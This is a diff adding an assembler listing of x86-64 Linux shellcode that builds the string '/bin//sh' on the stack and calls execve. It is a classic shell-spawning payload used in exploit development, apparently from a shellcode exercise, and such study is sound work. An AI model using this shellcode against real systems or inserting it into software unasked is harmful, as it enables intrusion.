@@ -1,0 +1,13 @@
+     1                                  section .text
+     2                                    global _start
+     3                                      _start:
+     4 00000000 4831D2                        xor     rdx, rdx
+     5 00000003 4831F6                        xor     rsi, rsi
+     6 00000006 56                            push    rsi
+     7 00000007 48BB2F62696E2F2F73-           mov     rbx, 0x68732f2f6e69622f
+     7 00000010 68                 
+     8 00000011 53                            push    rbx
+     9 00000012 54                            push    rsp
+    10 00000013 5F                            pop     rdi
+    11 00000014 B03B                          mov     al, 0x3b
+    12 00000016 0F05                          syscall 
